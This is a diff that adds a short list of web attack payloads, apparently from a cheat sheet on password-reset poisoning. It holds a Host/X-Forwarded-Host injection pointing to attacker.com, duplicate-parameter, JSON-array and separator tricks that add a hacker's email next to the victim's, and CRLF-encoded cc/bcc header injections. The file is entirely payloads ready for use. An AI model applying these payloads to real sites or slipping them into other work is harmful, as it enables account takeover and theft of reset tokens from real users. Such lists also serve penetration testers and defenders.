@@ -1,0 +1,16 @@
+
+Host: attacker.com, X-Forwarded-Host: attacker.com
+
+email=victim@mail.com&email=hacker@mail.com
+
+# array of emails
+{"email":["victim@mail.com","hacker@mail.com"]}
+
+# carbon copy
+email=victim@mail.com%0A%0Dcc:hacker@mail.com
+email=victim@mail.com%0A%0Dbcc:hacker@mail.com
+
+# separator
+email=victim@mail.com,hacker@mail.com
+email=victim@mail.com%20hacker@mail.com
+email=victim@mail.com|hacker@mail.com
